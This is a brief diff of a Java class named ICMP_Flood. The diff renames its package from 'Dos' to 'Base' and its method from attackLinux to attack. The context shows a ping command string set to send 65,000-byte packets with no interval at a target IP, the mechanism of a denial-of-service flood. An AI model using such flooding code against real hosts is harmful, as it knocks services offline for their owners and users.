@@ -1,4 +1,4 @@
-package Dos;
+package Base;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -11,7 +11,7 @@ import java.io.InputStreamReader;
 public class ICMP_Flood {
 
 
-    public static void attackLinux(String targetIP) {
+    public static void attack(String targetIP) {
 
         String pingCmd = "ping -s 65000 -i 0 "; // The maximum ping value (65,000 byte per pinging, without interval)
 
